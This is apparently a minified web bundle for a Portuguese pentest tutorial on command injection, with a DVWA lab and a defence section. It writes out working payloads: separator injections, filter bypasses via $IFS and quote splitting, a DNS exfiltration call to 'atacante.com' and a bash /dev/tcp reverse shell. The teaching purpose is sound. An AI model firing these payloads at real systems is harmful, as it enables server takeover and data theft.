import{j as e}from"./index-CAFCz3B4.js";import{P as s}from"./PageContainer-CxmWgrx_.js";import{A as i}from"./AlertBox-Dze8I6Zt.js";import{C as a}from"./CodeBlock-C6bWIuPM.js";import{C as o}from"./CommandTable-CZCYoWRB.js";import{T as t,P as c}from"./PracticeBox-BDRu97pg.js";function n(){return e.jsxs(s,{title:"Command Injection — RCE via input",subtitle:"Quando input do usuário vai para o shell. Detectção, execução cega e bypass de filtros.",difficulty:"intermediario",timeToRead:"13 min",children:[e.jsx("h2",{children:"O bug"}),e.jsx(a,{language:"php",title:"código vulnerável típico (qualquer linguagem)",code:`<?php
// PHP
$ip = $_GET['ip'];
shell_exec("ping -c 4 " . $ip);    // VULN

// Python
host = request.args.get('host')
os.system(f"nslookup {host}")       # VULN

// Node.js
const { exec } = require('child_process');
exec('git log ' + req.body.repo);   // VULN

// Java
Runtime.getRuntime().exec("nmap -sV " + req.getParameter("target"));  // VULN`}),e.jsx("h2",{children:"Operadores de shell que mudam tudo"}),e.jsx(o,{title:"Os 'cara' do shell",variations:[{cmd:";",desc:"Roda em sequência (independente).",output:"ls; whoami → executa os 2"},{cmd:"&&",desc:"AND lógico — só roda 2º se 1º deu OK.",output:"ls && id → id só se ls deu certo"},{cmd:"||",desc:"OR lógico — só roda 2º se 1º falhou.",output:"ls /naoexiste || id → id roda"},{cmd:"&",desc:"Background.",output:"sleep 10 & echo done → echo imediato"},{cmd:"|",desc:"Pipe (saída do 1º vai pro 2º).",output:"cat /etc/passwd | grep root"},{cmd:"$(cmd) ou \\`cmd\\`",desc:"Command substitution.",output:"echo $(whoami) → echo root"},{cmd:"%0a (newline)",desc:"Quebra de linha — equivale a ;.",output:"Útil em URL: ?ip=8.8.8.8%0aid"},{cmd:"{cmd1,cmd2}",desc:"Brace expansion.",output:"{ls,/}"}]}),e.jsx("h2",{children:"Detecção — exec visível"}),e.jsx(t,{path:"~",lines:[{comment:"request normal",cmd:"curl 'https://app.local/ping?ip=8.8.8.8'",out:`PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=58 time=14.2 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=58 time=14.5 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss`,outType:"info"},{comment:"agora tente injection com ;",cmd:"curl 'https://app.local/ping?ip=8.8.8.8;id'",out:`PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=58 time=14.2 ms

uid=33(www-data) gid=33(www-data) groups=33(www-data)`,outType:"error"},{comment:"ou pipe",cmd:"curl 'https://app.local/ping?ip=8.8.8.8|id'",out:`(o ping NÃO roda — ip vira args do id, mas a saída do id aparece)
uid=33(www-data) gid=33(www-data) groups=33(www-data)`,outType:"warning"}]}),e.jsx("h2",{children:"Detecção — blind / time-based"}),e.jsx(t,{path:"~",lines:[{comment:"se a resposta SEMPRE é igual, use sleep e meça tempo",cmd:"time curl -s 'https://app.local/check?host=8.8.8.8' > /dev/null",out:`real    0m0.412s
user    0m0.014s
sys     0m0.008s`,outType:"default"},{cmd:"time curl -s 'https://app.local/check?host=8.8.8.8;sleep+5' > /dev/null",out:`real    0m5.421s     ← +5s = injection confirmada!
user    0m0.012s
sys     0m0.008s`,outType:"warning"},{comment:"exfil via DNS (atacante tem nameserver controlado)",cmd:"curl 'https://app.local/check?host=8.8.8.8;`whoami`.atacante.com'",out:"(no log do nameserver: 'www-data.atacante.com requested A record')",outType:"error"}]}),e.jsx("h2",{children:"Bypass de filtros"}),e.jsx(t,{path:"~",lines:[{comment:"filtro: bloqueia ; e |",cmd:"curl 'https://app.local/p?ip=8.8.8.8%0aid'",out:`(usa newline %0a — funciona como ; em muitos shells)
uid=33(www-data)...`,outType:"info"},{comment:"filtro: bloqueia espaço",cmd:"curl 'https://app.local/p?ip=8.8.8.8;cat${IFS}/etc/passwd'",out:`(usa $IFS = Internal Field Separator do bash, default = ' \\t\\n')
root:x:0:0:root:...`,outType:"warning"},{cmd:"curl 'https://app.local/p?ip=8.8.8.8;{cat,/etc/passwd}'",out:"(brace expansion não usa espaço)",outType:"default"},{cmd:"curl 'https://app.local/p?ip=8.8.8.8;cat%09/etc/passwd'",out:"(usa TAB %09 em vez de espaço)",outType:"default"},{comment:"filtro: bloqueia 'cat'",cmd:"curl 'https://app.local/p?ip=8.8.8.8;c''at${IFS}/etc/passwd'",out:`(quebra a string com aspas vazias: c'' + 'at' = cat)
root:x:0:0...`,outType:"default"},{cmd:"curl 'https://app.local/p?ip=8.8.8.8;\\\\cat${IFS}/etc/passwd'",out:"(usa \\\\ que ignora alias mas mantém o binário)",outType:"default"}]}),e.jsx("h2",{children:"Reverse shell via cmd injection"}),e.jsx(t,{path:"~",lines:[{comment:"atacante: listener",cmd:"nc -lvnp 4444",out:"Listening on 0.0.0.0 4444",outType:"info"},{comment:"vítima: curl URL-encoded com bash reverse",cmd:"curl 'https://app.local/p?ip=8.8.8.8;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.42%2F4444%200%3E%261%22'",out:"(curl trava — porque a shell ficou aberta)",outType:"default"},{comment:"atacante: shell recebida",cmd:"(no listener)",out:`Connection received on 200.150.10.42 51234
www-data@app:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)`,outType:"error"}]}),e.jsx("h2",{children:"Linguagens em que aparece muito"}),e.jsx(o,{title:"Funções perigosas — caça aos sinks",variations:[{cmd:"PHP",desc:"exec, shell_exec, system, passthru, popen, proc_open, backticks (`).",output:"Procure no GREP qualquer um desses."},{cmd:"Python",desc:"os.system, os.popen, subprocess.call/run/Popen com shell=True.",output:"Sem shell=True é seguro."},{cmd:"Node.js",desc:"child_process.exec (vs execFile/spawn que são seguros).",output:"Use execFile com array de args."},{cmd:"Ruby",desc:"system, exec, %x[], backticks (`).",output:"Idem PHP."},{cmd:"Java",desc:"Runtime.exec, ProcessBuilder.command com string única.",output:"ProcessBuilder com lista de args = seguro."},{cmd:"Go",desc:'os/exec.Command com sh -c "..." + input.',output:'exec.Command("ls", path) seguro.'}]}),e.jsx("h2",{children:"Ferramenta — commix"}),e.jsx(t,{path:"~",lines:[{cmd:"commix --url='https://app.local/ping?ip=8.8.8.8' --batch",out:`                                      __                       
   ___    ___     ___ ___    ___ ___ /\\_\\   __  _   
 /'___\\ / __\`\\ /' __\` __\`\\ /' __\` __\`\\/\\ \\ /\\ \\/'\\  
/\\ \\__//\\ \\L\\ \\/\\ \\/\\ \\/\\ \\/\\ \\/\\ \\/\\ \\ \\ \\\\/>  </  
\\ \\____\\ \\____/\\ \\_\\ \\_\\ \\_\\ \\_\\ \\_\\ \\_\\ \\_\\/\\_/\\_\\
 \\/____/\\/___/  \\/_/\\/_/\\/_/\\/_/\\/_/\\/_/\\/_/\\//\\/_/

[*] Estimating target's response time...
[*] Performing time-based attack on parameter 'ip'...
[+] Parameter 'ip' is vulnerable.
[*] Type: 'time-based'
[*] Operating System: Linux

commix(os_shell) > id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

commix(os_shell) > cat /etc/shadow
cat: /etc/shadow: Permission denied

commix(os_shell) > sudo -l
[sudo] password for www-data: Sorry, try again.`,outType:"warning"}]}),e.jsx("h2",{children:"Defesa"}),e.jsx(a,{language:"python",title:"formas SEGURAS de chamar comandos externos",code:`# RUIM (Python)
import os
os.system(f"nslookup {host}")       # VULN

# RUIM
import subprocess
subprocess.run(f"nslookup {host}", shell=True)   # VULN

# BOM — array de args, sem shell
subprocess.run(["nslookup", host], shell=False, check=True)

# MELHOR — validar input antes (regex de IP/hostname)
import re
if not re.fullmatch(r"[a-zA-Z0-9.-]+", host):
    raise ValueError("Hostname inválido")
subprocess.run(["nslookup", host], shell=False, check=True)

# IDEAL — usar lib do problema, não shell
import socket
print(socket.gethostbyname(host))`}),e.jsx(c,{title:"Pwn no DVWA — Command Injection",goal:"Detectar e escalar para RCE via injection no formulário de ping do DVWA.",steps:["Suba DVWA, login admin/password.","Vá em 'Command Injection', dificuldade Low.","Tente: 127.0.0.1; id","Confirme uid=www-data.","Suba para Medium (filtra ; e &&) e tente | id ou %0aid.","Suba para High (filtra mais) e tente bypass com $IFS ou outras técnicas."],command:`URL="http://localhost:8080/vulnerabilities/exec/"
COOKIE="PHPSESSID=...; security=low"

# Low
curl -X POST "$URL" -b "$COOKIE" -d "ip=127.0.0.1;id&Submit=Submit"

# Medium  
curl -X POST "$URL" -b "PHPSESSID=...; security=medium" -d "ip=127.0.0.1|id&Submit=Submit"

# High (filtra | e ;) — usa newline
curl -X POST "$URL" -b "PHPSESSID=...; security=high" --data-urlencode "ip=127.0.0.1
id" --data "Submit=Submit"`,expected:"uid=33(www-data) gid=33(www-data) groups=33(www-data)",verify:"O 'uid=33(www-data)' deve aparecer na resposta HTML em todos os 3 níveis com a técnica certa."}),e.jsx(i,{type:"danger",title:"RCE = controle do servidor",children:"Command Injection é o pior cenário em web pentest — você ganha shell sem precisar de exploit complexo. Sempre reporte como CRITICAL com exemplo claro de payload."})]})}export{n as default};
